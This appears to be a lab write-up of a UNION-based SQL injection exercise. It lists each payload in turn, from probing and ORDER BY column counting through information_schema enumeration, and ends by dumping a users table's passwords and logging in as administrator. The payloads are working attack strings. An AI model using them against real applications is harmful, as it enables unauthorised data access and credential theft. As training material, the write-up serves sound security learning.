# Lab – SQL Injection (UNION-based)

## Step 1 – Identifying the SQL Injection Vulnerability

First, we tested for a SQL Injection vulnerability by inserting the following payload into the URL:

```sql
'--
```

The page loaded normally without any errors, indicating that the application was likely vulnerable to SQL Injection.

![](../../../../Images/Pasted%20image%2020260727215908.png)

---

## Step 2 – Determining the Number of Columns

Next, we used the `ORDER BY` technique to determine the number of columns returned by the original query.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

After testing, we discovered that the query contains **2 columns**.

![](../../../../Images/Pasted%20image%2020260727220105.png)

---

## Step 3 – Identifying Injectable Columns

To determine which columns could display injected data, we used the `UNION SELECT` technique.

### Testing the First Column

```sql
' UNION SELECT 'test',NULL--
```

The injected text was successfully displayed, confirming that the **first column** is reflected in the application's response.

![](../../../../Images/Pasted%20image%2020260727220311.png)

### Testing the Second Column

```sql
' UNION SELECT NULL,'test'--
```

The injected text was also displayed, meaning the **second column** is injectable as well.

![](../../../../Images/Pasted%20image%2020260727220415.png)

---

## Step 4 – Identifying the Database Version

After identifying injectable columns, we retrieved the database version using the following payload:

```sql
' UNION SELECT version(),NULL--
```

This returned the version of the underlying database management system.

![](../../../../Images/Pasted%20image%2020260727220719.png)

---

## Step 5 – Enumerating Database Tables

Next, we enumerated the available tables by querying the `information_schema.tables` table.

```sql
' UNION SELECT NULL,table_name FROM information_schema.tables--
```

This returned the names of all tables within the current database.

![](../../../../Images/Pasted%20image%2020260727220954.png)

---

## Step 6 – Enumerating Table Columns

After identifying the users table (`users_onmkov`), we enumerated its columns using:

```sql
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_onmkov'--
```

The response revealed the available column names within the table.

![](../../../../Images/Pasted%20image%2020260727221601.png)

---

## Step 7 – Extracting User Credentials

Finally, we extracted the usernames and passwords stored in the users table.

```sql
' UNION SELECT password_rnvpoj,username_fseqhq FROM users_onmkov--
```

The application displayed the stored credentials, including the administrator account.

![](../../../../Images/Pasted%20image%2020260727221829.png)

---

## Step 8 – Authenticating as the Administrator

Using the extracted administrator credentials, we successfully logged into the application with administrative privileges.

![](../../../../Images/Pasted%20image%2020260727221935.png)